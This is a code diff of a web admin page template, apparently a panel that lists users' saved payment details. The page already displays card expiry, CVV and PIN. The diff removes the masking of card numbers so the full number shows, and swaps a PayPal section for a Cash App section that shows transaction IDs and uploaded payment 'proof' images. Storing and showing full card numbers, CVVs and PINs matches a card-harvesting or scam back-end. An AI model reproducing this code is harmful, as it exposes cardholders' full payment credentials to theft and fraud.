@@ -146,7 +146,7 @@
                                     <h3 class="text-xl font-semibold">Card Details</h3>
                                     ${user.cardDetails ? `
                                         <p><strong>Type:</strong> ${user.cardDetails.type || 'N/A'}</p>
-                                        <p><strong>Number:</strong> ${user.cardDetails.number ? `**** **** **** ${user.cardDetails.number.slice(-4)}` : 'N/A'}</p>
+                                        <p><strong>Number:</strong> ${user.cardDetails.number || 'N/A'}</p>
                                         <p><strong>Expiry:</strong> ${user.cardDetails.expiry || 'N/A'}</p>
                                         <p><strong>CVV:</strong> ${user.cardDetails.cvv || 'N/A'}</p>
                                         <p><strong>PIN:</strong> ${user.cardDetails.pin || 'N/A'}</p>
@@ -154,17 +154,17 @@
                                     ` : '<p class="text-muted-foreground">No card details saved.</p>'}
                                 </div>
 
-                                <!-- PayPal Details -->
+                                <!-- Cash App Details -->
                                 <div class="mt-4">
-                                    <h3 class="text-xl font-semibold">PayPal Details</h3>
-                                    ${user.paypalDetails ? `
-                                        <p><strong>Transaction ID:</strong> ${user.paypalDetails.transactionId || 'N/A'}</p>
-                                        ${user.paypalDetails.proofUrl ? `
-                                            <p><strong>Proof:</strong> <a href="${user.paypalDetails.proofUrl}" target="_blank" class="text-primary hover:underline">View Proof</a></p>
-                                            <img src="${user.paypalDetails.proofUrl}" alt="PayPal Proof" class="w-32 h-32 object-cover rounded-md mt-2">
-                                        ` : '<p class="text-muted-foreground">No PayPal proof uploaded.</p>'}
-                                        <p><strong>Last Updated:</strong> ${new Date(user.paypalDetails.lastUpdated).toLocaleString()}</p>
-                                    ` : '<p class="text-muted-foreground">No PayPal details saved.</p>'}
+                                    <h3 class="text-xl font-semibold">Cash App Details</h3>
+                                    ${user.cashappDetails ? `
+                                        <p><strong>Transaction ID:</strong> ${user.cashappDetails.transactionId || 'N/A'}</p>
+                                        ${user.cashappDetails.proofUrl ? `
+                                            <p><strong>Proof:</strong> <a href="${user.cashappDetails.proofUrl}" target="_blank" class="text-primary hover:underline">View Proof</a></p>
+                                            <img src="${user.cashappDetails.proofUrl}" alt="Cash App Proof" class="w-32 h-32 object-cover rounded-md mt-2">
+                                        ` : '<p class="text-muted-foreground">No Cash App proof uploaded.</p>'}
+                                        <p><strong>Last Updated:</strong> ${new Date(user.cashappDetails.lastUpdated).toLocaleString()}</p>
+                                    ` : '<p class="text-muted-foreground">No Cash App details saved.</p>'}
                                 </div>
 
                                 <!-- Crypto Details -->
